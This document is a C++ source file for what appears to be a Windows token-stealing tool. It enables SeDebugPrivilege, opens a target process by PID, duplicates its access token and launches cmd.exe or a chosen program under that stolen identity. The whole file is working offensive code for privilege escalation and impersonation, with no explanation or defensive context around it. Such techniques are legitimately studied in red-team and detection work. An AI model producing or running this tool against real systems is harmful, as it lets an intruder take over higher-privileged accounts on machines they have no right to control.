#include <Windows.h>
#include <iostream>

BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, privilege, &luid)) {
        std::cerr << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::cerr << "[-] AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <Source PID> [Program Path] [Arguments]\n";
        return 1;
    }

    DWORD sourcePid = atoi(argv[1]);
    LPCWSTR program = L"cmd.exe";
    LPWSTR arguments = NULL;

    // If a second parameter is provided, use it as the program path
    if (argc >= 3) {
        size_t programSize = strlen(argv[2]) + 1;
        wchar_t* wideProgram = new wchar_t[programSize];
        mbstowcs(wideProgram, argv[2], programSize);
        program = wideProgram;
    }

    // If a third parameter is provided, use it as the arguments
    if (argc >= 4) {
        size_t argumentsSize = strlen(argv[3]) + 1;
        wchar_t* wideArguments = new wchar_t[argumentsSize];
        mbstowcs(wideArguments, argv[3], argumentsSize);
        arguments = wideArguments;
    }

    // Open the current process token to enable SeDebugPrivilege
    HANDLE hCurrentProcessToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hCurrentProcessToken)) {
        std::cerr << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return 1;
    }

    // Enable SeDebugPrivilege
    if (!EnablePrivilege(hCurrentProcessToken, L"SeDebugPrivilege")) {
        std::cerr << "[-] Failed to enable SeDebugPrivilege.\n";
        return 1;
    }
    std::cout << "[+] SeDebugPrivilege enabled.\n";

    // Open the source process
    HANDLE hSourceProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sourcePid);
    if (!hSourceProcess) {
        std::cerr << "[-] OpenProcess (Source) failed. Error: " << GetLastError() << "\n";
        return 1;
    }

    // Open the token of the source process
    HANDLE hSourceToken;
    if (!OpenProcessToken(hSourceProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSourceToken)) {
        std::cerr << "[-] OpenProcessToken (Source) failed. Error: " << GetLastError() << "\n";
        return 1;
    }

    // Duplicate the token
    HANDLE hDuplicateToken;
    if (!DuplicateTokenEx(hSourceToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
        std::cerr << "[-] DuplicateTokenEx failed. Error: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Token duplicated successfully!\n";

    // Prepare to create the new process with the duplicated token
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;

    // Create the new process with the duplicated token
    if (!CreateProcessWithTokenW(
            hDuplicateToken,
            LOGON_WITH_PROFILE,
            program,
            arguments,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi))
    {
        std::cerr << "[-] CreateProcessWithTokenW failed. Error: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "[+] Process started successfully!\n";

    // Cleanup handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDuplicateToken);
    CloseHandle(hSourceToken);
    CloseHandle(hSourceProcess);
    CloseHandle(hCurrentProcessToken);

    // Cleanup allocated memory
    if (argc >= 3) delete[] program;
    if (argc >= 4) delete[] arguments;

    return 0;
}
